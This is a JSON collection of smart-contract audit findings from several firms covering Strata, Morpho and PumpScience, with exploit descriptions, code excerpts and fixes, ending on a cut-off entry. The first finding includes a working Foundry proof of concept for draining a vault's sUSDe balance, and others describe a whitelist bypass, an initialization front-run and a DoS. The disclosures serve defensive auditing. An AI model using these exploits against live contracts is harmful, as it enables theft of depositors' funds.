    {
      "id": "57015",
      "title": "An attacker can drain the entire protocol balance of sUSDe during the yield phase due to incorrect redemption accounting logic in `pUSDeVault::_withdraw`",
      "impact": "HIGH",
      "content": "**Description:** After transitioning to the yield phase, the entire protocol balance of USDe is deposited into sUSDe and pUSDe can be deposited into the yUSDe vault to earn additional yield from the sUSDe. When initiating a redemption, `yUSDeVault::_withdraw` is called which in turn invokes `pUSDeVault::redeem`:\n\n```solidity\n    function _withdraw(address caller, address receiver, address owner, uint256 pUSDeAssets, uint256 shares) internal override {\n        if (!withdrawalsEnabled) {\n            revert WithdrawalsDisabled();\n        }\n\n        if (caller != owner) {\n            _spendAllowance(owner, caller, shares);\n        }\n\n\n        _burn(owner, shares);\n@>      pUSDeVault.redeem(pUSDeAssets, receiver, address(this));\n        emit Withdraw(caller, receiver, owner, pUSDeAssets, shares);\n    }\n```\n\nThis is intended to have the overall effect of atomically redeeming yUSDe -> pUSDe -> sUSDe by previewing and applying any necessary yield from sUSDe:\n\n```solidity\n    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {\n\n            if (PreDepositPhase.YieldPhase == currentPhase) {\n                // sUSDeAssets = sUSDeAssets + user_yield_sUSDe\n@>              assets += previewYield(caller, shares);\n\n@>              uint sUSDeAssets = sUSDe.previewWithdraw(assets); // @audit - this rounds up because sUSDe requires the amount of sUSDe burned to receive assets amount of USDe to round up, but below we are transferring this rounded value out to the receiver which actually rounds against the protocol/yUSDe depositors!\n\n                _withdraw(\n                    address(sUSDe),\n                    caller,\n                    receiver,\n                    owner,\n                    assets, // @audit - this should not include the yield, since it is decremented from depositedBase\n                    sUSDeAssets,\n                    shares\n                );\n                return;\n            }\n        ...\n    }\n```\n\nHowever, by incrementing `assets` in the case where this is a yUSDe redemption and there has been yield accrued by sUSDe, this will attempt to decrement the `depositedBase` state by more than intended:\n\n```solidity\n    function _withdraw(\n            address token,\n            address caller,\n            address receiver,\n            address owner,\n            uint256 baseAssets,\n            uint256 tokenAssets,\n            uint256 shares\n        ) internal virtual {\n            if (caller != owner) {\n                _spendAllowance(owner, caller, shares);\n            }\n@>          depositedBase -= baseAssets; // @audit - this can underflow when redeeming yUSDe because previewYield() increments assets based on sUSDe preview but this decrement should be equivalent to the base asset amount that is actually withdrawn from the vault (without yield)\n\n            _burn(owner, shares);\n            SafeERC20.safeTransfer(IERC20(token), receiver, tokenAssets);\n            onAfterWithdrawalChecks();\n\n            emit Withdraw(caller, receiver, owner, baseAssets, shares);\n            emit OnMetaWithdraw(receiver, token, tokenAssets, shares);\n        }\n```\n\nIf the incorrect state update results in an unexpected underflow then yUSDe depositors may be unable to redeem their shares (principal + yield). However, if a faulty yUSDe redemption is processed successfully (i.e. if the relative amount of USDe underlying pUSDe is sufficiently large compared to the total supply of yUSDe and the corresponding sUSDe yield) then pUSDe depositors will erroneously and unexpectedly redeem their shares for significantly less USDe than they originally deposited. This effect will be magnified by subsequent yUSDe redemptions as the `total_yield_USDe` will be computed as larger than it is in reality due to `depositedBase` being much smaller than it should be:\n\n```solidity\n    function previewYield(address caller, uint256 shares) public view virtual returns (uint256) {\n        if (PreDepositPhase.YieldPhase == currentPhase && caller == address(yUSDe)) {\n            uint total_sUSDe = sUSDe.balanceOf(address(this));\n            uint total_USDe = sUSDe.previewRedeem(total_sUSDe);\n\n@>          uint total_yield_USDe = total_USDe - Math.min(total_USDe, depositedBase);\n            uint y_pUSDeShares = balanceOf(caller);\n\n            uint caller_yield_USDe = total_yield_USDe.mulDiv(shares, y_pUSDeShares, Math.Rounding.Floor);\n\n            return caller_yield_USDe;\n        }\n        return 0;\n    }\n```\n\nThis in turn causes `depositedBase` to be further decremented until it is eventually tends to zero, impacting all functionality that relies of the overridden `totalAssets()`. Given that it is possible to inflate the sUSDe yield by either transferring USDe directly or waiting to sandwich a legitimate yield accrual (since `sUSDe::previewRedeem` does not account for the vesting schedule) this allows an attacker to completely devastate the pUSDe/yUSDe accounting, redeeming their yUSDe for close to the entire protocol sUSDe balance at the expense of all other depositors.\n\n**Impact:** Significant loss of user funds.\n\n**Proof of Concept:**\n```solidity\npragma solidity 0.8.28;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {ERC1967Proxy} from \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport {IERC4626} from \"@openzeppelin/contracts/interfaces/IERC4626.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\nimport {MockUSDe} from \"../contracts/test/MockUSDe.sol\";\nimport {MockStakedUSDe} from \"../contracts/test/MockStakedUSDe.sol\";\nimport {MockERC4626} from \"../contracts/test/MockERC4626.sol\";\n\nimport {pUSDeVault} from \"../contracts/predeposit/pUSDeVault.sol\";\nimport {yUSDeVault} from \"../contracts/predeposit/yUSDeVault.sol\";\n\nimport {console2} from \"forge-std/console2.sol\";\n\ncontract CritTest is Test {\n    uint256 constant MIN_SHARES = 0.1 ether;\n\n    MockUSDe public USDe;\n    MockStakedUSDe public sUSDe;\n    pUSDeVault public pUSDe;\n    yUSDeVault public yUSDe;\n\n    address account;\n\n    address alice = makeAddr(\"alice\");\n    address bob = makeAddr(\"bob\");\n\n    function setUp() public {\n        address owner = msg.sender;\n\n        // Prepare Ethena and Ethreal contracts\n        USDe = new MockUSDe();\n        sUSDe = new MockStakedUSDe(USDe, owner, owner);\n\n        // Prepare pUSDe and Depositor contracts\n        pUSDe = pUSDeVault(\n            address(\n                new ERC1967Proxy(\n                    address(new pUSDeVault()),\n                    abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)\n                )\n            )\n        );\n\n        yUSDe = yUSDeVault(\n            address(\n                new ERC1967Proxy(\n                    address(new yUSDeVault()),\n                    abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)\n                )\n            )\n        );\n\n        vm.startPrank(owner);\n        pUSDe.setDepositsEnabled(true);\n        pUSDe.setWithdrawalsEnabled(true);\n        pUSDe.updateYUSDeVault(address(yUSDe));\n\n        // deposit USDe and burn minimum shares to avoid reverting on redemption\n        uint256 initialUSDeAmount = pUSDe.previewMint(MIN_SHARES);\n        USDe.mint(owner, initialUSDeAmount);\n        USDe.approve(address(pUSDe), initialUSDeAmount);\n        pUSDe.mint(MIN_SHARES, address(0xdead));\n        vm.stopPrank();\n\n        if (pUSDe.balanceOf(address(0xdead)) != MIN_SHARES) {\n            revert(\"address(0xdead) should have MIN_SHARES shares of pUSDe\");\n        }\n    }\n\n    function test_crit() public {\n        uint256 aliceDeposit = 100 ether;\n        uint256 bobDeposit = 2 * aliceDeposit;\n\n        // fund users\n        USDe.mint(alice, aliceDeposit);\n        USDe.mint(bob, bobDeposit);\n\n        // alice deposits into pUSDe\n        vm.startPrank(alice);\n        USDe.approve(address(pUSDe), aliceDeposit);\n        uint256 aliceShares_pUSDe = pUSDe.deposit(aliceDeposit, alice);\n        vm.stopPrank();\n\n        // bob deposits into pUSDe\n        vm.startPrank(bob);\n        USDe.approve(address(pUSDe), bobDeposit);\n        uint256 bobShares_pUSDe = pUSDe.deposit(bobDeposit, bob);\n        vm.stopPrank();\n\n        // setup assertions\n        assertEq(pUSDe.balanceOf(alice), aliceShares_pUSDe, \"Alice should have shares equal to her deposit\");\n        assertEq(pUSDe.balanceOf(bob), bobShares_pUSDe, \"Bob should have shares equal to his deposit\");\n\n        {\n            // phase change\n            account = msg.sender;\n            uint256 initialAdminTransferAmount = 1e6;\n            vm.startPrank(account);\n            USDe.mint(account, initialAdminTransferAmount);\n            USDe.approve(address(pUSDe), initialAdminTransferAmount);\n            pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));\n            pUSDe.startYieldPhase();\n            yUSDe.setDepositsEnabled(true);\n            yUSDe.setWithdrawalsEnabled(true);\n            vm.stopPrank();\n        }\n\n        // bob deposits into yUSDe\n        vm.startPrank(bob);\n        pUSDe.approve(address(yUSDe), bobShares_pUSDe);\n        uint256 bobShares_yUSDe = yUSDe.deposit(bobShares_pUSDe, bob);\n        vm.stopPrank();\n\n        // simulate sUSDe yield transfer\n        uint256 sUSDeYieldAmount = 100 ether;\n        USDe.mint(address(sUSDe), sUSDeYieldAmount);\n\n        {\n            // bob redeems from yUSDe\n            uint256 bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);\n            vm.prank(bob);\n            yUSDe.redeem(bobShares_yUSDe/2, bob, bob);\n            uint256 bobRedeemed_sUSDe = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;\n            uint256 bobRedeemed_USDe = sUSDe.previewRedeem(bobRedeemed_sUSDe);\n\n            console2.log(\"Bob redeemed sUSDe (1): %s\", bobRedeemed_sUSDe);\n            console2.log(\"Bob} redeemed USDe (1): %s\", bobRedeemed_USDe);\n\n            // bob can redeem again\n            bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);\n            vm.prank(bob);\n            yUSDe.redeem(bobShares_yUSDe/5, bob, bob);\n            uint256 bobRedeemed_sUSDe_2 = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;\n            uint256 bobRedeemed_USDe_2 = sUSDe.previewRedeem(bobRedeemed_sUSDe);\n\n            console2.log(\"Bob redeemed sUSDe (2): %s\", bobRedeemed_sUSDe_2);\n            console2.log(\"Bob redeemed USDe (2): %s\", bobRedeemed_USDe_2);\n\n            // bob redeems once more\n            bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);\n            vm.prank(bob);\n            yUSDe.redeem(bobShares_yUSDe/6, bob, bob);\n            uint256 bobRedeemed_sUSDe_3 = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;\n            uint256 bobRedeemed_USDe_3 = sUSDe.previewRedeem(bobRedeemed_sUSDe);\n\n            console2.log(\"Bob redeemed sUSDe (3): %s\", bobRedeemed_sUSDe_3);\n            console2.log(\"Bob redeemed USDe (3): %s\", bobRedeemed_USDe_3);\n        }\n\n        console2.log(\"pUSDe balance of sUSDe after bob's redemptions: %s\", sUSDe.balanceOf(address(pUSDe)));\n        console2.log(\"pUSDe depositedBase after bob's redemptions: %s\", pUSDe.depositedBase());\n\n        // alice redeems from pUSDe\n        uint256 aliceBalanceBefore_sUSDe = sUSDe.balanceOf(alice);\n        vm.prank(alice);\n        uint256 aliceRedeemed_USDe_reported = pUSDe.redeem(aliceShares_pUSDe, alice, alice);\n        uint256 aliceRedeemed_sUSDe = sUSDe.balanceOf(alice) - aliceBalanceBefore_sUSDe;\n        uint256 aliceRedeemed_USDe = sUSDe.previewRedeem(aliceRedeemed_sUSDe);\n\n        console2.log(\"Alice redeemed sUSDe: %s\", aliceRedeemed_sUSDe);\n        console2.log(\"Alice redeemed USDe: %s\", aliceRedeemed_USDe);\n        console2.log(\"Alice lost %s USDe\", aliceDeposit - aliceRedeemed_USDe);\n\n        // uncomment to observe the assertion fail\n        // assertApproxEqAbs(aliceRedeemed_USDe, aliceDeposit, 10, \"Alice should redeem approximately her deposit in USDe\");\n    }\n}\n```\n\n**Recommended Mitigation:** While the assets corresponding to the accrued yield should be included when previewing the sUSDe withdrawal, only the base assets should be passed to the subsequent call to `_withdraw()`:\n\n```diff\nfunction _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {\n\n        if (PreDepositPhase.YieldPhase == currentPhase) {\n            // sUSDeAssets = sUSDeAssets + user_yield_sUSDe\n--          assets += previewYield(caller, shares);\n++          uint256 assetsPlusYield = assets + previewYield(caller, shares);\n\n--          uint sUSDeAssets = sUSDe.previewWithdraw(assets);\n++          uint sUSDeAssets = sUSDe.previewWithdraw(assetsPlusYield);\n\n            _withdraw(\n                address(sUSDe),\n                caller,\n                receiver,\n                owner,\n                assets\n                sUSDeAssets,\n                shares\n            );\n            return;\n        }\n    ...\n}\n```\n\n**Strata:** Fixed in commit [903d052](https://github.com/Strata-Money/contracts/commit/903d0528eedf784a34a393bd9210adb28451b27c).\n\n**Cyfrin:** Verified. Yield is no longer included within the decremented assets amount and the test now passes with the assertion included.\n\n\\clearpage",
      "summary": "\nThis bug report describes an issue with the yield phase of the protocol, where the `yUSDeVault::_withdraw` function is called to redeem yUSDe -> pUSDe -> sUSDe. However, the `yUSDeVault::_withdraw` function increments the `assets` variable, causing an incorrect state update that can result in significant loss of user funds. This is due to the fact that the `total_yield_USDe` is computed as larger than it is in reality, leading to a decrease in the `depositedBase` state. This can cause an unexpected underflow, making it impossible for yUSDe depositors to redeem their shares. The bug has been fixed in the Strata commit [903d052](https://github.com/Strata-Money/contracts/commit/903d0528eedf784a34a393bd9210adb28451b27c). ",
      "quality_score": 4.5,
      "rarity_score": 2.5,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "49325",
      "title": "Non-whitelisted users can mint vault shares with permissioned tokens through the bundler ",
      "impact": "MEDIUM",
      "content": "## Context\n- GeneralAdapter1.sol#L57-L68\n- GeneralAdapter1.sol#L224-L246\n\n## Description\nIn PR 233, `GeneralAdapter1.erc20WrapperDepositFor()` was modified such that wrapped tokens are minted to the `initiator()` instead of any receiver address:\n\n```solidity\nfunction erc20WrapperDepositFor(address wrapper, uint256 amount) external onlyBundler3 {\n    IERC20 underlying = ERC20Wrapper(wrapper).underlying();\n    if (amount == type(uint256).max) amount = underlying.balanceOf(address(this));\n    require(amount != 0, ErrorsLib.ZeroAmount());\n    SafeERC20.forceApprove(underlying, wrapper, type(uint256).max);\n    require(ERC20Wrapper(wrapper).depositFor(initiator(), amount), ErrorsLib.DepositFailed());\n    SafeERC20.forceApprove(underlying, wrapper, 0);\n}\n```\n\nThis change was made to prevent users who are not whitelisted by a permissioned token from minting vault shares through the bundler. \n\nUsing `verUSDC` as an example, a non-whitelisted user could previously do the following:\n- Send USDC to `GeneralAdapter1`.\n- Call `erc20WrapperDepositFor()` to wrap USDC  verUSDC, with receiver as `GeneralAdapter1`.\n- Call `morphoSupply()` to deposit verUSDC, with `onBehalf` as himself.\n\nHowever, by directly minting permissioned tokens to the adapter, it is still possible for a non-whitelisted user to mint vault shares. More specifically, a non-whitelisted user can:\n- Directly call `verUSDC.depositFor()` with `account` as `GeneralAdapter1`, which mints verUSDC to `GeneralAdapter1`.\n- Call `morphoSupply()` to deposit verUSDC, with `onBehalf` as himself.\n\nThis attack is possible as `depositFor()` only checks if `account` is whitelisted; there is no restriction on the caller. As a result, attackers will still be able to use the bundler to bypass any form of whitelist in permissioned tokens.\n\n## Recommendation\nConsider moving the `erc20WrapperDepositFor()` and `erc20WrapperWithdrawTo()` functions to a standalone adapter only meant for ERC20 permissioned tokens.\n\nTo block non-whitelisted users from minting vault shares, the adapter should check that the initiator is whitelisted in `morphoSupply()` and all other deposit functions (e.g. `erc4626Mint()`).\n\nTo block non-whitelisted users from withdrawing vault shares (e.g. Morpho shares  verUSDC  USDC), check that the initiator is whitelisted in `erc20WrapperWithdrawTo()`. This prevents users from withdrawing permissioned tokens to the adapter and using the adapter to unwrap them.\n\n## Morpho\nFixed in commit `263f75d` by:\n- Restricting `withdrawTo()` so that the initiator must be whitelisted. With this change, users can bypass the `depositFor()` restriction by depositing directly to the adapter, but they cannot later unwrap their tokens.\n- Moving wrap and unwrap actions from `GeneralAdapter1` to `ERC20WrapperAdapter`, because we want to develop a better solution for permissioned tokens later and do not want to redeploy `GeneralAdapter1`.\n- Adding a morpho-specific `morphoWrapperDepositFor()` function to `GeneralAdapter1`.\n\n## Cantina Managed\nVerified, the issue has been fixed by creating a standalone adapter. Although non-whitelisted users are still able to mint vault shares with permissioned tokens, they will not be able to unwrap the tokens after withdrawing shares.\n\nNote that a non-whitelisted user is still able to wrap tokens and send them to whitelisted addresses through `ERC20Wrapper.depositFor()`  `CoreAdapter.erc20Transfer()`.",
      "summary": "\nThe bug report discusses a recent change made in PR 233 to GeneralAdapter1.erc20WrapperDepositFor(). The change was made to prevent non-whitelisted users from minting vault shares through the bundler. However, it was discovered that this change did not fully prevent non-whitelisted users from minting vault shares using a specific method. The recommendation is to move the erc20WrapperDepositFor() and erc20WrapperWithdrawTo() functions to a standalone adapter only meant for ERC20Permissioned tokens. The issue has been fixed by creating a standalone adapter, but note that non-whitelisted users can still mint vault shares with permissioned tokens, but will not be able to unwrap them after withdrawing shares. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_february2025.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Om Parikh",
        "MiloTruck"
      ]
    },
    {
      "id": "45305",
      "title": "[L-05] The Global Account may be initialized early by the attacker",
      "impact": "LOW",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** Low\n\n## Description\n\nThe Global Account uses a fixed string (Global::SEED_PREFIX\n) as its seeds, and anyone can call the initialization function as long as `global.initialized` is not set.\n\n```rust\n#[event_cpi]\n#[derive(Accounts)]\n#[instruction(params: GlobalSettingsInput)]\npub struct Initialize<'info> {\n    #[account(mut)]\n    authority: Signer<'info>,\n\n    #[account(\n        init,\n        space = 8 + Global::INIT_SPACE,\n@>    seeds = [Global::SEED_PREFIX.as_bytes()],\n@>    constraint = global.initialized != true @ ContractError::AlreadyInitialized,\n        bump,\n        payer = authority,\n    )]\n    global: Box<Account<'info, Global>>,\n\n    system_program: Program<'info, System>,\n}\n\nimpl Initialize<'_> {\n    pub fn handler(ctx: Context<Initialize>, params: GlobalSettingsInput) -> Result<()> {\n        let global = &mut ctx.accounts.global;\n        global.update_authority(GlobalAuthorityInput {\n            global_authority: Some(ctx.accounts.authority.key()),\n            migration_authority: Some(ctx.accounts.authority.key()),\n        });\n        global.update_settings(params.clone());\n\n        require_gt!(global.mint_decimals, 0, ContractError::InvalidArgument);\n\n        global.initialized = true;\n        emit_cpi!(global.into_event());\n        Ok(())\n    }\n}\n```\n\nTherefore, an attacker can preemptively call the initialization function to set its own address as the administrator. As a result, the Global Account cannot be reset.\n\n## Recommendations\n\nCall the signer's address as seeds, or just run the fixed address call initialization function.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45304",
      "title": "[L-04] Insufficient Token Account validation in pool initialization",
      "impact": "LOW",
      "content": "Several token accounts in the `InitializePoolWithConfig` instruction lack proper ownership and mint relationship validation, relying on `UncheckedAccount` instead of proper token account validation. This could allow to pass incorrect token accounts.\n\nThe current implementation uses `UncheckedAccount` for multiple token-related accounts:\n\n```rust\n#[derive(Accounts)]\npub struct InitializePoolWithConfig<'info> {\n    #[account(mut)]\n    /// CHECK: Token A LP\n    pub a_vault_lp: UncheckedAccount<'info>,\n\n    #[account(mut)]\n    /// CHECK: Vault LP accounts and mints for token A\n    pub a_token_vault: UncheckedAccount<'info>,\n\n    // ... other unchecked token accounts\n}\n```\n\nThis lacks validation for:\n\n1. Token account ownership verification\n2. Mint relationship verification\n3. Type safety provided by Anchor's account validation\n\nAdd proper token account validation:\n\n```rust\n#[derive(Accounts)]\npub struct InitializePoolWithConfig<'info> {\n    #[account(\n        mut,\n        constraint = a_vault_lp.owner == vault_program.key() @ ContractError::InvalidOwner,\n        constraint = a_vault_lp.mint == a_vault_lp_mint.key() @ ContractError::InvalidMint\n    )]\n    pub a_vault_lp: Box<Account<'info, TokenAccount>>,\n\n    #[account(\n        mut,\n        constraint = a_token_vault.owner == vault_program.key() @ ContractError::InvalidOwner,\n        constraint = a_token_vault.mint == token_a_mint.key() @ ContractError::InvalidMint\n    )]\n    pub a_token_vault: Box<Account<'info, TokenAccount>>,\n\n    // Similar changes for other token accounts\n}\n```\n\nAdd new error variants:\n\n```rust\n#[error_code]\npub enum ContractError {\n    #[msg(\"Invalid token account owner\")]\n    InvalidOwner,\n\n    #[msg(\"Invalid token account mint\")]\n    InvalidMint,\n}\n```\n\nApply similar validation to all token accounts:\n\n- Vault LP accounts (a_vault_lp, b_vault_lp)\n- Token vault accounts (a_token_vault, b_token_vault)\n- Payer token accounts (payer_token_a, payer_token_b)\n- Protocol fee accounts (protocol_token_a_fee, protocol_token_b_fee)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45303",
      "title": "[L-03] State Inconsistency Due to Solana Rollback",
      "impact": "LOW",
      "content": "One function in the protocol is vulnerable to state inconsistencies in the event of a Solana rollback:\n\n1. **Setting Config Parameters**:\n   - Global configuration parameters could become outdated during a Solana rollback\n   - Protocol could operate with old, invalid settings\n   - Potential for system malfunction or vulnerabilities\n\nRecommendation:\n\n1. **Detect Outdated Configurations**\n\n   - Utilize the `LastRestartSlot` sysvar to check configuration validity\n   - Automatically pause protocol if the configuration is outdated\n   - Require admin intervention before resuming operations\n\n2. **Add last_updated_slot Field**\n\n   - Include tracking field in bonding curve state\n   - Monitor configuration update timestamps\n\n3. **Implement Outdated Configuration Check**\n   ```rust\n   fn is_config_outdated(global: &Global) -> Result<bool> {\n       let last_restart_slot = LastRestartSlot::get()?;\n       Ok(global.last_updated_slot <= last_restart_slot.last_restart_slot)\n   }\n   ```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45302",
      "title": "[L-02] Insufficient validation in global parameter updates",
      "impact": "LOW",
      "content": "The `set_params` function allows updating protocol parameters without proper validation:\n\n```rust\npub fn set_params(ctx: Context<SetParams>, params: GlobalSettingsInput) -> Result<()> {\n    SetParams::handler(ctx, params)\n}\n```\n\nLooking at the `GlobalSettingsInput` struct:\n\n```rust\npub struct GlobalSettingsInput {\n    pub initial_virtual_token_reserves: Option<u64>,\n    pub initial_virtual_sol_reserves: Option<u64>,\n    pub initial_real_token_reserves: Option<u64>,\n    pub token_total_supply: Option<u64>,\n    pub mint_decimals: Option<u8>,\n    pub migrate_fee_amount: Option<u64>,\n    pub migration_token_allocation: Option<u64>,\n    pub fee_receiver: Option<Pubkey>,\n    pub whitelist_enabled: Option<bool>,\n    pub meteora_config: Option<Pubkey>,\n}\n```\n\nConsider adding comprehensive parameter validation.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45301",
      "title": "[L-01] Insufficient SOL balance check ignores rent exemption",
      "impact": "LOW",
      "content": "In the swap function's buy tokens validation, the code only checks if the user's total SOL balance is sufficient for the swap amount, without considering rent exemption:\n\n```rust\nrequire!(\n    ctx.accounts.user.get_lamports() >= exact_in_amount,\n    ContractError::InsufficientUserSOL,\n);\n````\n\n[programs/pump-science/src/instructions/curve/swap.rs#L177](https://github.com/moleculeprotocol/pump-science-contract/blob/main/programs/pump-science/src/instructions/curve/swap.rs#L177)\n\nThis check uses `get_lamports()` which returns the total balance including the rent exemption amount. The transaction will succeed even if it depletes the account below rent exemption, causing the account to:\n\n- Enter a non-rent-exempt state\n- Get charged rent over time by the Solana runtime, eventually be purged if the balance is fully depleted.\n\nAdd a more comprehensive balance check that accounts for rent exemption:\n\n```rust\nlet rent = Rent::get()?;\nlet min_rent = rent.minimum_balance(0); // 0 for data size since this is just a native SOL account\nrequire!(\n    ctx.accounts.user.get_lamports() >= exact_in_amount.checked_add(min_rent).unwrap(),\n    ContractError::InsufficientUserSOL,\n);\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45300",
      "title": "[M-02] DOS of CreateBondingCurve",
      "impact": "MEDIUM",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n## Description\n\nThe `CreateBondingCurve` instruction requires passing `bonding_curve_token_account`:\n\n```rust\n    #[account(\n        init,\n        payer = creator,\n        associated_token::mint = mint,\n        associated_token::authority = bonding_curve,\n    )]\n    bonding_curve_token_account: Box<Account<'info, TokenAccount>>,\n```\n\n`bonding_curve_token_account` uses `associated_token::mint` and `associated_token::authority`, so the `TokenAccount` can be created in advance.\nIf this already exists, creating the function will fail because init is used.\n\nAn attacker can extract the calculated `bonding_curve` address and create a `TokenAccount` to prevent users from creating a Bonding Curve.\n\n## Recommendations\n\n````diff\n    #[account(\n-        init,\n+        init_if_needed,\n        payer = creator,\n        associated_token::mint = mint,\n        associated_token::authority = bonding_curve,\n    )]\n    bonding_curve_token_account: Box<Account<'info, TokenAccount>>,```",
      "summary": "\nThe report states that there is a bug in the `CreateBondingCurve` instruction that requires passing a `bonding_curve_token_account`. This account uses `associated_token::mint` and `associated_token::authority`, which means it can be created in advance. However, if it already exists, the function will fail. This can be exploited by an attacker who can create a `TokenAccount` and prevent users from creating a Bonding Curve. The recommendation is to change the `init` to `init_if_needed` to prevent this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45299",
      "title": "[M-01] Start slot validation allows past slots",
      "impact": "MEDIUM",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n## Description\n\nThe protocol implements a fee schedule that should progress from high fees (99%) to low fees (1%) over time based on slots passed since launch. However, the current implementation validates the `start_slot` parameter incorrectly:\n\n```rust\npub fn validate(&self, params: &CreateBondingCurveParams) -> Result<()> {\n    let clock = Clock::get()?;\n    // validate start time\n    if let Some(start_slot) = params.start_slot {\n        require!(start_slot <= clock.slot, ContractError::InvalidStartTime)\n    }\n    // ...\n}\n```\n\nThis validation only ensures the start_slot is not in the future (`start_slot <= clock.slot`), meaning creators can set a start slot far in the past. This breaks the intended fee progression since `slots_passed = current_slot - start_slot` would immediately start at a later fee stage.\n\nFor example:\nThe current slot is 1000\n\n- Creator sets start_slot to 800\n  The first trade occurs at slot 1000, slots_passed = 1000 - 800 = 200\n- This means trading starts in Phase 2 (~5% fee) instead of Phase 1 (99% fee)\n\n## Recommendations\n\nThe start slot validation should be updated to only allow start slots within a small range of the current slot, ensuring the fee schedule starts from Phase 1 as intended.",
      "summary": "\nThe current implementation of a protocol has a bug that affects the fee schedule. The fee schedule should gradually decrease from 99% to 1% over time based on the slots that have passed since launch. However, the current validation for the `start_slot` parameter is incorrect. It only checks that the start slot is not in the future, meaning that creators can set a start slot far in the past. This causes the fee schedule to immediately start at a later stage, breaking the intended progression. The bug can be fixed by updating the start slot validation to only allow start slots within a small range of the current slot, ensuring that the fee schedule starts from the beginning as intended.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45298",
      "title": "[H-03] Unused freeze authority revocation creates token lock risk",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** High\n\n**Likelihood:** Medium\n\n## Description\n\nThe codebase includes a `revoke_freeze_authority` function in `locker.rs` that is not being called during pool creation, despite being necessary to prevent tokens from being frozen after migration.\n\nIf the freeze authority is not revoked:\n\n- The bonding curve program retains the ability to freeze token accounts\n- This could potentially be used to lock user tokens after migration\n- Goes against the intended design where locking should only be possible during pre-trading\n\n**Code Location :** [locker.rs#L83](https://github.com/moleculeprotocol/pump-science-contract/blob/54daf1b93cf6abf955c69f043f73b4df671f97f7/programs/pump-science/src/state/bonding_curve/locker.rs#L83)\n\n## Recommendations\n\nIt's recommended that the freeze authority revocation call be added.",
      "summary": "\nThe report mentions a bug in the codebase where a function called `revoke_freeze_authority` is not being used when creating a pool. This function is important because it prevents tokens from being frozen after they have been migrated. If this function is not used, it could potentially allow the bonding curve program to freeze user tokens, which goes against the intended design. The location of the code is also provided and it is recommended that the function be added to fix this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45297",
